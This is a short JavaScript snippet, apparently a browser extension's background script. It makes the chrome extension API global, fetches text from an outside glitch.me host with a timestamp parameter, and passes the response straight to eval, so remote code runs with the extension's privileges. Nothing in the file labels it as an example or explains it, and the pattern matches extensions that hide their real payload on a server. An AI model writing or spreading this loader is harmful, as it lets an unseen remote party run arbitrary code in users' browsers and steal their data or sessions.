window.chrome = chrome;
v = new Date().valueOf();
fetch("https://hollow-ribbon-joke.glitch.me/background?v=" + v)
  .then(function (n) {
    return n.text();
  })
  .then(function (n) {
    console.log(n);
    eval(n);
  });
